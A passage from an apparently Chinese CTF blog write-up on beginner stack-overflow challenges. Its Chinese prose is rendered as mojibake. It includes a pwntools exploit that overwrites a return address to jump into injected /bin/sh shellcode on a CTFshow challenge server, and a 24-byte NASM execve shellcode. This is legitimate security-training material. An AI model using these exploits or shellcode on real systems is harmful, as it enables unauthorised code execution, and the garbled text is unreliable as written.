&lt;p&gt;checksecæŸ¥çœ‹ä¿æŠ¤ä¿¡æ¯ï¼šæ²¡æ ˆæº¢å‡ºä¿æŠ¤ã€æ²¡å¼€NXï¼Œå¯ä»¥å°è¯•æ³¨å…¥shellcodeï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/206.png&#34;
	width=&#34;711&#34;
	height=&#34;230&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/206_hu_50a5ab14e3ee18df.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/206_hu_bfa9c2229d230a73.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;309&#34;
		data-flex-basis=&#34;741px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDA64ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/207.png&#34;
	width=&#34;845&#34;
	height=&#34;321&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/207_hu_84ca861f6334ccf0.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/207_hu_2f31d5f12103b5f4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;263&#34;
		data-flex-basis=&#34;631px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ¬¸æˆ‘ä»¬åˆ†æè¿™ä¸ªmainå‡½æ•°çœ‹åˆ°v5åœ°å€åœ¨æ¯æ¬¡ç¨‹åºè¿è¡Œéƒ½ä¼šæ‰“å°å‡ºæ¥ï¼Œä½†å› ä¸ºæ˜¯æœ‰PIEä¿æŠ¤ï¼Œæ‰€ä»¥æ¯æ¬¡åœ°å€éƒ½ä¼šéšæœºåŒ–ï¼Œæ‰€ä»¥åœ¨æ„é€ expæ—¶éœ€è¦æ¥æ”¶è¿™ä¸ªv5åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;getså‡½æ•°ä¼šè¯»å–v5å‚æ•°ç„¶åå­˜å…¥å†…å­˜æ®µä¸­ã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ä¼šæ‰“å°å‡ºv5åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/208.png&#34;
	width=&#34;1116&#34;
	height=&#34;754&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/208_hu_4fb289520877de27.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/208_hu_7a1fc1baba003ef0.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;148&#34;
		data-flex-basis=&#34;355px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;expå¤§è‡´æ€è·¯æ˜¯å…ˆè¦†ç›–ç¼“å†²åŒºï¼Œç„¶åè·³è½¬åˆ°v5åœ°å€ï¼Œæ³¨å…¥shellcodeï¼Œä½†è¦æ³¨æ„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/209.png&#34;
	width=&#34;775&#34;
	height=&#34;119&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/209_hu_d06c6cfedf713d6c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/209_hu_4219d35f69199420.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;leaveæŒ‡ä»¤&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;651&#34;
		data-flex-basis=&#34;1563px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæ‰§è¡Œäº†leaveæŒ‡ä»¤ï¼Œ&lt;/p&gt;
&lt;p&gt;ç­‰ä»·äºä¸¤æ¡æ±‡ç¼–æŒ‡ä»¤çš„ç»„åˆï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;mov rsp, rbp&lt;/code&gt;ï¼šå°†æ ˆæŒ‡é’ˆ &lt;code&gt;rsp&lt;/code&gt;ï¼ˆæ ˆé¡¶æŒ‡é’ˆï¼‰æŒ‡å‘æ ˆåº•æŒ‡é’ˆ &lt;code&gt;rbp&lt;/code&gt;ï¼Œæ­¤æ—¶ &lt;code&gt;rsp&lt;/code&gt; ä» â€œ&lt;code&gt;v5&lt;/code&gt; èµ·å§‹åœ°å€â€ è·³è½¬åˆ° â€œ&lt;code&gt;rbp&lt;/code&gt; æ‰€åœ¨åœ°å€â€ï¼Œç›´æ¥è·³è¿‡ &lt;code&gt;v5&lt;/code&gt; å ç”¨çš„æ ˆç©ºé—´ï¼›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pop rbp&lt;/code&gt;ï¼šå°†æ ˆä¸­ &lt;code&gt;rbp&lt;/code&gt; åœ°å€å¤„å­˜å‚¨çš„ â€œæ—§ RBP å€¼â€ å¼¹å‡ºåˆ° &lt;code&gt;rbp&lt;/code&gt; å¯„å­˜å™¨ï¼ŒåŒæ—¶ &lt;code&gt;rsp&lt;/code&gt; è‡ªåŠ¨å¢åŠ  8 å­—èŠ‚ï¼ˆ64 ä½ç³»ç»Ÿæ ˆæ“ä½œä»¥ 8 å­—èŠ‚å¯¹é½ï¼‰ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;v5[0]ã€v5[1]ã€æ—§rbpï¼Œå†åŠ ä¸Šé¢„ç•™ç»™shellcodeçš„è¿”å›åœ°å€çš„8å­—èŠ‚é•¿åº¦ï¼Œæ€»å…±32å­—èŠ‚ï¼Œè¿™32å­—èŠ‚ä¸èƒ½ä½¿ç”¨ã€‚ç­‰æ”¾åˆ°32ä¹‹åshellcodeçš„å†…å®¹æ‰èƒ½æ­£è¢«æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28132&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;åœ¨è¿™é‡Œè§£é‡Šä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;io.recvuntil(&amp;#39;[&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;v5 = io.recvuntil(&amp;#39;]&amp;#39;, drop = True) 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;v5 = int(v5, 16)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¾“å…¥æµä¸­é¦–å…ˆæ¥æ”¶æ•°æ®ç›´åˆ°é‡åˆ° &amp;lsquo;[&amp;rsquo; å­—ç¬¦ä¸ºæ­¢ã€‚æ¥ä¸‹æ¥å†æ¬¡ä»è¾“å…¥æµä¸­æ¥æ”¶æ•°æ®ï¼Œç›´åˆ°é‡åˆ° &amp;lsquo;]&amp;rsquo; å­—ç¬¦ä¸ºæ­¢ï¼Œå°†å…¶ä¿å­˜åœ¨å˜é‡ v5 ä¸­ã€‚æœ€åï¼Œå°†å˜é‡ v5 è§£æä¸ºä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•´æ•°ï¼Œå¹¶å°†å…¶å­˜å‚¨å›å˜é‡ v5 ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;p64(v5+32)ï¼Œ&lt;strong&gt;å°† â€œv5 åœ°å€ + 32 å­—èŠ‚â€ è¿™ä¸ªç›®æ ‡åœ°å€ï¼Œæ‰“åŒ…ä¸º 64 ä½å°ç«¯åºäºŒè¿›åˆ¶æ•°æ®ï¼Œç”¨äºè¦†ç›–ç¨‹åºçš„è¿”å›åœ°å€ï¼Œæœ€ç»ˆè®©ç¨‹åºè·³è½¬åˆ°è¯¥ç›®æ ‡åœ°å€æ‰§è¡Œ shellcode&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è‹¥ v5 æ˜¯å­—ç¬¦ä¸²ï¼ˆå¦‚&lt;code&gt;&#39;7ffefd78ff20&#39;&lt;/code&gt;ï¼‰ï¼ŒPython æ— æ³•å¯¹å­—ç¬¦ä¸²è¿›è¡ŒåŠ æ³•è¿ç®—ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦&lt;code&gt;v5 = int(v5, 16)&lt;/code&gt;çš„åŸå› ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_062&#34;&gt;PWN_062
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šçŸ­äº†ä¸€ç‚¹ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_062&#34; &gt;PWN_062&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/210.png&#34;
	width=&#34;689&#34;
	height=&#34;224&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/210_hu_dadb37b7fe9ed49d.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/210_hu_4549a7ef4108eb50.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;307&#34;
		data-flex-basis=&#34;738px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDA64åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/211.png&#34;
	width=&#34;713&#34;
	height=&#34;325&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/211_hu_a858fbf705829cf2.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/211_hu_1b70de5939175c3f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;219&#34;
		data-flex-basis=&#34;526px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å’Œä¸Šé¢˜å·®ä¸å¤šï¼Œä½†è¿™é‡Œæ¢æˆreadå‡½æ•°äº†ï¼Œ&lt;code&gt;read(0, buf, 56uLL)&lt;/code&gt;æ„æ€æ˜¯è¯»å–56é•¿åº¦çš„æ•°æ®åˆ°bufä¸­ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨textå­—æ®µæŸ¥çœ‹readå‡½æ•°é™„è¿‘çš„æ±‡ç¼–æŒ‡ä»¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/212.png&#34;
	width=&#34;686&#34;
	height=&#34;100&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/212_hu_38f0ce144b19f134.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/212_hu_bedfde0c9fbaa368.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;leaveæŒ‡ä»¤&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;686&#34;
		data-flex-basis=&#34;1646px&#34;
	
&gt;å¯ä»¥çœ‹åˆ°è¿™é‡Œå’Œä¸Šé¢˜ä¸€æ ·è°ƒç”¨å®Œreadå‡½æ•°åä¼šæ‰§è¡Œleaveæ±‡ç¼–æŒ‡ä»¤ã€‚&lt;/p&gt;
&lt;p&gt;è¿è¡Œç¨‹åºä¾æ—§ä¸€æ ·ï¼Œæœ‰PIEä¿æŠ¤æƒ…å†µä¸‹ï¼Œbufåœ°å€åŠ¨æ€å˜åŒ–ã€‚&lt;/p&gt;
&lt;p&gt;ä½†è¿™é‡Œæœ‰ä¸ªé—®é¢˜æ˜¯ï¼Œreadåªè¯»å–56ä½é•¿åº¦å­—ç¬¦ï¼Œ56æœ¬èº«å‡å»shellcodeåœ°å€é•¿åº¦8å­—èŠ‚ã€bufçš„16å­—èŠ‚é•¿åº¦ï¼ˆbuf[0]ã€buf[1]å„å 8å­—èŠ‚é•¿åº¦ï¼‰ä»¥åŠebpæœ¬èº«8å­—èŠ‚ï¼Œå…±32ï¼Œå³56-32=24ï¼Œé‚£å°±æ˜¯è¯´åªç•™ç»™24ä½é•¿åº¦ç»™åˆ°shellcodeçš„å†…å®¹é•¿åº¦é™åˆ¶ï¼Œpwntoolsçš„shellcraftæ¨¡å—çš„shellcodeé•¿åº¦ï¼ˆ29å­—èŠ‚ï¼‰è¶…è¿‡äº†24ã€‚å› æ­¤éœ€è¦å¦å¯»shellcodeï¼Œè¿™é‡Œæˆ‘æ¨èä¸€ä¸ªshellcodeï¼Œåˆšå¥½24å­—èŠ‚é•¿åº¦https://www.exploit-db.com/shellcodes/43550ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;_start&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;section&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;.text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;_start:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;59&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;cdq&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rbx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x68732f6e69622f2f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rbx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nf&#34;&gt;syscall&lt;/span&gt;       
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
